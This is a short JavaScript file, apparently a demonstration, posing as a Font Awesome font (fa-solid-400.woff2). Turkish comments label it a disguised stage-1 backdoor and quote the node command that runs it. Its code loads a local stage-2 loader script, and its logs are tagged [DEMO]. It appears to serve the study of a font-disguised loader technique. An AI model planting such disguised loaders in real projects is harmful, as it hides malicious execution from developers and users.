// fa-solid-400.woff2 - Stage-1 backdoor (font kılığında)
// Bu dosya aslında bir JavaScript dosyasıdır.
// Rapor: %WINDIR%\System32\cmd.exe /d /c node ./public/fontawesome/fa-solid-400.woff2

try {
    console.log('[DEMO] Stage-1: fa-solid-400.woff2 çalıştı.');
    
    // Stage-2 loader'ı çağır
    const path = require('path');
    const loaderPath = path.join(__dirname, '..', '..', 'scripts', 'stage2-loader.js');
    
    // loader dosyasının var olduğunu kontrol et
    const fs = require('fs');
    if (fs.existsSync(loaderPath)) {
        require(loaderPath);
        console.log('[DEMO] Stage-1: stage2-loader.js başarıyla çalıştırıldı.');
    } else {
        console.error('[DEMO] Stage-1: stage2-loader.js bulunamadı!');
    }
} catch (err) {
    console.error('[DEMO] Stage-1 hata:', err.message);
}